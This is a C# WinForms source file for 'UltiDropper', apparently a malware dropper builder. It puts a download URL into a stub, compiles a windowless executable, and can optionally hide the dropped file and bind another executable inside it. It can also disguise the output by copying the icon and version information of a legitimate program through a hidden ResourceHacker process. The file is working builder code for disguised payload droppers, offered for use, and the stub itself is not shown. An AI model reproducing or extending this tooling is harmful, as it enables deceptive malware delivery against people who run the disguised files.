using System;
using System.Windows.Forms;
using UltiDropper.Properties;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.Resources;
using Microsoft.CSharp;
using System.Drawing;
using System.Linq;
using System.Web;
using UltiDropper.IconFolder;

namespace UltiDropper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            _currentFolder = AppDomain.CurrentDomain.BaseDirectory;
        }

        private Icon _icon;
        private string _fileToCloneLocation;
        private readonly string _currentFolder;

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(tbLocation.Text)) return;

            Uri uri;
            if (!Uri.TryCreate(tbLocation.Text, UriKind.Absolute, out uri) && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps))
            {
                MessageBox.Show(Resources.BadUrl, Resources.Name, MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                return;
            }

            string path;
            using (var sfd = new SaveFileDialog())
            {
                if (sfd.ShowDialog() != DialogResult.OK) return;
                path = sfd.FileName;
            }

            var source = Resources.Stub;

            source = source.Replace("[LINK]", tbLocation.Text);

            var compilerargs = new CompilerParameters(new []{"System.dll"}) { GenerateExecutable = true, OutputAssembly = path, CompilerOptions = "/target:winexe /platform:x86" };

            if (_icon != null)
            {
                var tempfilename = Path.GetTempPath() + "\\tempico.ico";
                using (var fileStream = new FileStream(tempfilename, FileMode.OpenOrCreate))
                    _icon.Save(fileStream);

                compilerargs.CompilerOptions += " /win32icon:" + tempfilename;
            }

            source = source.Replace("[HIDE]",cbHideFile.Checked ? "File.SetAttributes(loc, FileAttributes.Hidden);" : string.Empty);

            //binder
            if (!string.IsNullOrEmpty(tbFile.Text))
            {
                compilerargs.EmbeddedResources.Add("files.resources");

                var dropsource = Resources.Binder;
                using (var rw = new ResourceWriter("files.resources"))
                {
                    var resourcename = Guid.NewGuid().ToString().Replace("-", "");
                    dropsource = dropsource.Replace("[RESOURCE]", resourcename);
                    rw.AddResource(resourcename, File.ReadAllBytes(tbFile.Text));
                }

                source = source.Replace("[BINDCODE]", dropsource);
            }
            else
            {
                source = source.Replace("[BINDCODE]", string.Empty);
            }

            var compilerresult = new CSharpCodeProvider().CompileAssemblyFromSource(compilerargs, source);

            if (!string.IsNullOrEmpty(_fileToCloneLocation) && compilerresult.Errors.Count < 1)
            {
                var tempfilename = _currentFolder + "res.exe";
                File.WriteAllBytes(tempfilename, Resources.ResourceHacker);

                try
                {
                    var startinfo = new ProcessStartInfo { WindowStyle = ProcessWindowStyle.Hidden, FileName = tempfilename, Arguments = $"-extract {_fileToCloneLocation},{_currentFolder + "info.res"},versioninfo,," };
                    Process.Start(startinfo)?.WaitForExit();
                    startinfo.Arguments = $"-delete {path},{path},versioninfo,,";
                    Process.Start(startinfo)?.WaitForExit();
                    startinfo.Arguments = $"-addoverwrite {path},{path},{_currentFolder + "info.res"},versioninfo,,";
                    Process.Start(startinfo)?.WaitForExit();

                    File.Delete(tempfilename);
                    File.Delete(_currentFolder + "res.ini");
                    File.Delete(_currentFolder + "res.log");
                    File.Delete(_currentFolder + "info.res");
                    File.Delete(_currentFolder + "files.resources");
                }
                catch
                {
                    MessageBox.Show(Resources.VersionInfoFailure, Resources.Name, MessageBoxButtons.OK,MessageBoxIcon.Information);
                }

            }

            foreach (CompilerError error in compilerresult.Errors)
            {
                MessageBox.Show(error.ErrorText);
            }

        }

        private void btnOpenFile_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Filter = Resources.ExeFilter;
                ofd.FileName = string.Empty;

                if (ofd.ShowDialog() != DialogResult.OK) return;
                tbFile.Text = ofd.FileName;
            }
        }

        private void btnLoadIcon_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.FileName = string.Empty;
                ofd.Filter = Resources.IconFilter;
                if (ofd.ShowDialog() != DialogResult.OK || Path.GetExtension(ofd.FileName) != ".ico") return;

                _icon = new Icon(ofd.FileName);
                var icons = IconUtil.Split(_icon);
                var biggesticon = icons.Aggregate((icon1, icon2) => icon1.Width * icon1.Height > icon2.Width * icon2.Height ? icon1 : icon2);
                pictureBox1.Image = IconUtil.ToBitmap(biggesticon);
            }
        }

        private void btnClone_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.FileName = string.Empty;
                ofd.Filter = Resources.ExeFilter;
                if (ofd.ShowDialog() != DialogResult.OK) return;

                var iconextractor = new IconExtractor(ofd.FileName);
                var icons = IconUtil.Split(iconextractor.GetIcon(0));
                _icon = iconextractor.GetIcon(0);
                var biggesticon = icons.Aggregate((icon1, icon2) => icon1.Width * icon1.Height > icon2.Width * icon2.Height ? icon1 : icon2);
                pictureBox1.Image = IconUtil.ToBitmap(biggesticon);

                _fileToCloneLocation = ofd.FileName;
            }
        }
    }
}
